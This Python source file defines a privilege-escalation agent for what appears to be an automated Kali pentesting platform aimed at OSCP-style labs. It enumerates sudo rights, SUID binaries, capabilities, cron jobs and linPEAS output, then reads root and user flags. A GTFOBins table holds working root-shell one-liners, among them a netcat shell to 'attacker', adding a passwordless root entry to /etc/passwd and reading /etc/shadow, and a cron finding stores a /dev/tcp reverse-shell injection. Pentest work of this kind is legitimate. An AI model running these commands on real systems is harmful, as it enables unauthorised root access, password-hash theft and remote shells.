"""
KALI PENTEST PLATFORM v3 — PrivEsc Agent

Privilege escalation following OSCP/GTFOBins/HackTricks methodology.
Receives Instructions from MasterAgent. Does NOT call LLM.

Linux PrivEsc Vectors:
  1. linPEAS automated scan
  2. sudo -l misconfigurations → GTFOBins
  3. SUID binaries → GTFOBins
  4. Writable cron jobs → command injection
  5. Linux capabilities (getcap)
  6. World-writable paths in PATH
  7. Weak file permissions (passwd, shadow writable)
  8. Kernel exploits (kernel version → CVE)
  9. Docker/LXC group membership
  10. NFS no_root_squash

Windows PrivEsc Vectors:
  1. winPEAS
  2. AlwaysInstallElevated
  3. Unquoted service paths
  4. Weak service permissions
  5. Token impersonation (JuicyPotato/PrintSpoofer)
  6. Stored credentials (SAM, DPAPI)
"""

import re
from typing import Optional, Dict, List

from agents.base_agent import BaseAgent, Instruction, BroadcastFn
from db.schemas import AgentName, AgentStatus, AttackPhase, FindingSeverity
import db.mongo_client as db


# GTFOBins — binaries that allow privesc if set SUID or in sudo list
GTFOBINS = {
    "find":     "find . -exec /bin/sh \\; -quit",
    "vim":      "vim -c ':!/bin/sh'",
    "vi":       "vi -c ':!/bin/sh'",
    "python":   "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "python3":  "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "perl":     "perl -e 'exec \"/bin/sh\";'",
    "ruby":     "ruby -e 'exec \"/bin/sh\"'",
    "nmap":     "nmap --interactive; !sh",
    "less":     "less /etc/profile; !/bin/sh",
    "more":     "more /etc/profile; !/bin/sh",
    "awk":      "awk 'BEGIN {system(\"/bin/sh\")}'",
    "man":      "man man; !sh",
    "env":      "env /bin/sh",
    "cp":       "cp /bin/sh /tmp/sh; chmod u+s /tmp/sh; /tmp/sh -p",
    "tee":      "echo 'root::0:0:root:/root:/bin/bash' | tee -a /etc/passwd",
    "curl":     "curl file:///etc/shadow",
    "wget":     "wget file:///etc/shadow",
    "nc":       "nc -e /bin/sh attacker 4444",
    "ncat":     "ncat -e /bin/sh attacker 4444",
    "bash":     "bash -p",
    "sh":       "sh -p",
    "dash":     "dash -p",
    "tar":      "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "zip":      "zip /tmp/z.zip /tmp/z.zip -T --unzip-command='sh -c /bin/sh'",
    "gdb":      "gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit",
    "strace":   "strace -o /dev/null /bin/sh -p",
    "ltrace":   "ltrace /bin/sh",
    "node":     "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {\"-p\": true, stdio: \"inherit\"})'",
    "php":      "php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'",
    "lua":      "lua5.1 -e 'os.execute(\"/bin/sh\")'",
    "mysql":    "mysql -e '\\! sh'",
    "ftp":      "ftp; !/bin/sh",
    "socat":    "socat stdin exec:/bin/sh",
    "docker":   "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "git":      "git -p help; !sh",
}


class PrivescAgent(BaseAgent):

    def __init__(self, broadcast: Optional[BroadcastFn] = None):
        super().__init__(AgentName.PRIVESC, broadcast)
        self.phase = AttackPhase.PRIVESC

    async def run(
        self,
        session_id:   str,
        target:       str,
        current_user: Optional[str] = None,
        shell_id:     Optional[str] = None,
        os_type:      str = "linux",
        **kwargs
    ) -> Dict:
        self._session_id = session_id
        result = {
            "root_flag":      None,
            "method":         None,
            "suid_files":     [],
            "sudo_rights":    "",
            "kernel":         "",
            "linpeas_summary": "",
            "gtfobins_found": [],
            "capabilities":   []
        }

        await self.set_status(AgentStatus.RUNNING, f"PrivEsc on {target} as {current_user}")
        await self.emit_reasoning(
            step       = "privesc_start",
            reasoning  = f"Have shell as '{current_user}' — enumerate all privilege escalation vectors",
            decision   = "Run linPEAS first for comprehensive automated scan, then manual checks",
            next_action= "linpeas.sh → sudo -l → SUID → cron → kernel"
        )

        # ── 1. System info ─────────────────────────────────────
        uname = await self.run_tool("uname", "-a", target=target, phase=AttackPhase.PRIVESC, timeout=5)
        result["kernel"] = uname["stdout"].strip()

        whoami = await self.run_tool("whoami", "", target=target, phase=AttackPhase.PRIVESC, timeout=5)
        id_out = await self.run_tool("id", "", target=target, phase=AttackPhase.PRIVESC, timeout=5)

        await self.emit_reasoning(
            step       = "system_info",
            reasoning  = f"Kernel: {result['kernel'][:60]} | User: {whoami['stdout'].strip()} | ID: {id_out['stdout'].strip()}",
            decision   = "Check kernel version against known privesc CVEs",
            next_action= "If kernel < 4.4, check DirtyCow; if < 3.5 check mempodipper"
        )

        # ── 2. sudo -l ────────────────────────────────────────
        sudo = await self.run_tool("sudo", "-l", target=target, phase=AttackPhase.PRIVESC, timeout=10)
        result["sudo_rights"] = sudo["stdout"]

        if sudo["stdout"] and "NOPASSWD" in sudo["stdout"]:
            await self.emit_reasoning(
                step       = "sudo_nopasswd",
                reasoning  = "sudo NOPASSWD found — can run commands as root without password",
                decision   = "Check each NOPASSWD binary against GTFOBins",
                next_action= "Extract binary names and match to GTFOBins database",
                data       = {"sudo_output": sudo["stdout"][:500]}
            )
            # Extract NOPASSWD binaries
            binaries = re.findall(r'NOPASSWD:\s*(/[^\s,]+)', sudo["stdout"])
            for binary in binaries:
                bin_name = binary.split("/")[-1]
                if bin_name in GTFOBINS:
                    cmd = f"sudo {GTFOBINS[bin_name]}"
                    await self.store_finding(
                        severity    = FindingSeverity.CRITICAL,
                        title       = f"PrivEsc: sudo {bin_name} → root (GTFOBins)",
                        description = f"sudo NOPASSWD allows running {binary} as root. GTFOBins exploit: {cmd}",
                        host        = target,
                        tool_used   = "sudo",
                        evidence    = sudo["stdout"][:500],
                        remediation = f"Remove NOPASSWD from sudoers for {bin_name}",
                        extra       = {"exploit_cmd": cmd, "gtfobins": bin_name}
                    )
                    result["gtfobins_found"].append({"binary": bin_name, "cmd": cmd})

        # ── 3. SUID binaries ──────────────────────────────────
        await self.emit_reasoning(
            step       = "suid_check",
            reasoning  = "SUID binaries run as file owner (often root) regardless of calling user",
            decision   = "Find all SUID files and check against GTFOBins",
            next_action= "find / -perm -u=s -type f 2>/dev/null"
        )
        suid = await self.run_tool(
            "find", "/ -perm -u=s -type f 2>/dev/null",
            target=target, phase=AttackPhase.PRIVESC, timeout=60
        )
        suid_files = [l.strip() for l in suid["stdout"].splitlines() if l.strip()]
        result["suid_files"] = suid_files

        for f in suid_files:
            bin_name = f.split("/")[-1]
            if bin_name in GTFOBINS:
                exploit_cmd = GTFOBINS[bin_name].replace("sudo ", "")
                exploit_cmd = f"{f} {exploit_cmd}" if not f in exploit_cmd else exploit_cmd
                await self.store_finding(
                    severity    = FindingSeverity.CRITICAL,
                    title       = f"SUID PrivEsc: {f} → root (GTFOBins)",
                    description = f"SUID binary {f} can be exploited via GTFOBins: {exploit_cmd}",
                    host        = target,
                    tool_used   = "find",
                    evidence    = f"SUID: {f}",
                    remediation = f"Remove SUID bit: chmod u-s {f}",
                    extra       = {"exploit_cmd": exploit_cmd}
                )
                result["gtfobins_found"].append({"binary": f, "cmd": exploit_cmd, "type": "suid"})

        await self.add_node(
            node_id  = "suid_binaries",
            type     = "privesc_vector",
            label    = f"SUID Files ({len(suid_files)})",
            host     = target,
            metadata = {"files": suid_files[:10], "exploitable": [g["binary"] for g in result["gtfobins_found"]]}
        )

        # ── 4. Capabilities ───────────────────────────────────
        await self.emit_reasoning(
            step       = "capabilities",
            reasoning  = "Linux capabilities grant specific root powers to binaries without full SUID",
            decision   = "getcap to find binaries with dangerous capabilities",
            next_action= "getcap -r / 2>/dev/null"
        )
        caps = await self.run_tool("getcap", "-r / 2>/dev/null", target=target, phase=AttackPhase.PRIVESC, timeout=30)
        dangerous_caps = ["cap_setuid", "cap_net_raw", "cap_sys_admin", "cap_dac_override"]
        result["capabilities"] = [l for l in caps["stdout"].splitlines() if any(c in l for c in dangerous_caps)]

        for cap_line in result["capabilities"]:
            await self.store_finding(
                severity    = FindingSeverity.HIGH,
                title       = f"Dangerous Capability: {cap_line[:80]}",
                description = f"Binary with dangerous capability: {cap_line}",
                host        = target,
                tool_used   = "getcap",
                evidence    = cap_line
            )

        # ── 5. Cron jobs ──────────────────────────────────────
        await self.emit_reasoning(
            step       = "cron_check",
            reasoning  = "Writable cron jobs or scripts run by root can be modified for command injection",
            decision   = "Check crontab and /etc/cron.d for world-writable scripts",
            next_action= "cat /etc/crontab; ls -la /etc/cron.d/"
        )
        cron = await self.run_tool("bash", "-c 'cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null'",
                                    target=target, phase=AttackPhase.PRIVESC, timeout=10)
        if cron["stdout"]:
            # Check if any cron scripts are writable
            scripts = re.findall(r'(/[^\s]+\.sh)', cron["stdout"])
            for script in scripts:
                perm = await self.run_tool("bash", f"-c 'ls -la {script} 2>/dev/null'",
                                            target=target, phase=AttackPhase.PRIVESC, timeout=5)
                if "rwx" in perm["stdout"] or "rw-rw" in perm["stdout"]:
                    await self.store_finding(
                        severity    = FindingSeverity.CRITICAL,
                        title       = f"Writable Cron Script: {script}",
                        description = f"Cron script {script} is world-writable — inject reverse shell command",
                        host        = target,
                        tool_used   = "bash",
                        evidence    = perm["stdout"],
                        remediation = f"Fix permissions: chmod 700 {script}",
                        extra       = {"exploit": f"echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> {script}"}
                    )

        # ── 6. linPEAS (if available) ─────────────────────────
        linpeas_check = await self.check_tool_available("linpeas.sh")
        if not linpeas_check["available"]:
            # Try alternate paths
            for path in ["/usr/share/peass/linpeas.sh", "/opt/linpeas.sh", "/tmp/linpeas.sh"]:
                check = await self.run_tool("bash", f"-c 'test -f {path} && echo found'",
                                             target=target, phase=AttackPhase.PRIVESC, timeout=5)
                if "found" in check["stdout"]:
                    linpeas_check = {"available": True, "path": path}
                    break

        if linpeas_check.get("available"):
            await self.emit_reasoning(
                step       = "linpeas",
                reasoning  = "linPEAS provides comprehensive automated PrivEsc enumeration",
                decision   = "Run linPEAS for full coverage of PrivEsc vectors",
                next_action= f"{linpeas_check.get('path', 'linpeas.sh')} -a"
            )
            _lp_path = linpeas_check.get("path", "linpeas.sh")
            lp = await self.run_tool(
                "bash", f"-c '{_lp_path} -a 2>/dev/null'",
                target=target, phase=AttackPhase.PRIVESC, timeout=180
            )
            result["linpeas_summary"] = lp["stdout"][:5000]

            # Extract linPEAS critical findings (marked with 95%+ confidence)
            critical = re.findall(r'╔══.*?══╗.*?║.*?95%.*?(\d+%.*?)(?=╔|$)', lp["stdout"], re.DOTALL)
            for c in critical[:5]:
                await self.store_finding(
                    severity    = FindingSeverity.CRITICAL,
                    title       = "linPEAS High-Confidence PrivEsc Vector",
                    description = c[:500],
                    host        = target,
                    tool_used   = "linpeas",
                    evidence    = c[:500]
                )

        # ── 7. World-writable /etc/passwd ────────────────────
        passwd_perm = await self.run_tool("bash", "-c 'ls -la /etc/passwd /etc/shadow 2>/dev/null'",
                                           target=target, phase=AttackPhase.PRIVESC, timeout=5)
        if passwd_perm["stdout"]:
            for line in passwd_perm["stdout"].splitlines():
                if "-rw-rw-" in line or "-rw-r--rw" in line or "-rwxrwx" in line:
                    filename = line.split()[-1] if line.split() else ""
                    await self.store_finding(
                        severity    = FindingSeverity.CRITICAL,
                        title       = f"Writable: {filename}",
                        description = f"{filename} is world-writable — can add root user or read password hashes",
                        host        = target,
                        tool_used   = "bash",
                        evidence    = line,
                        remediation = f"chmod 644 /etc/passwd; chmod 640 /etc/shadow"
                    )

        # ── 8. Check for root flag ────────────────────────────
        root_check = await self.run_tool("bash",
            "-c 'cat /root/root.txt 2>/dev/null; cat /root/proof.txt 2>/dev/null'",
            target=target, phase=AttackPhase.PRIVESC, timeout=10
        )
        if root_check["stdout"].strip():
            flag_val = root_check["stdout"].strip()
            result["root_flag"] = flag_val
            await self.emit_reasoning(
                step       = "root_flag",
                reasoning  = "Root flag found — privilege escalation successful",
                decision   = "Capture and store root flag",
                next_action= "Store flag and generate report",
                data       = {"flag": flag_val}
            )
            await self.store_flag("root", flag_val, "/root/root.txt")
            await self.store_finding(
                severity    = FindingSeverity.CRITICAL,
                title       = "ROOT FLAG CAPTURED",
                description = f"Root flag obtained: {flag_val}",
                host        = target,
                tool_used   = "bash",
                evidence    = flag_val
            )

        # Also try user flag
        user_check = await self.run_tool("bash",
            "-c 'find /home -name user.txt -o -name local.txt 2>/dev/null | head -5 | xargs cat 2>/dev/null'",
            target=target, phase=AttackPhase.PRIVESC, timeout=10
        )
        if user_check["stdout"].strip():
            await self.store_flag("user", user_check["stdout"].strip(), "/home/*/user.txt")

        await self.set_status(AgentStatus.DONE,
            f"PrivEsc complete: {len(result['gtfobins_found'])} GTFOBins vectors found")
        return result
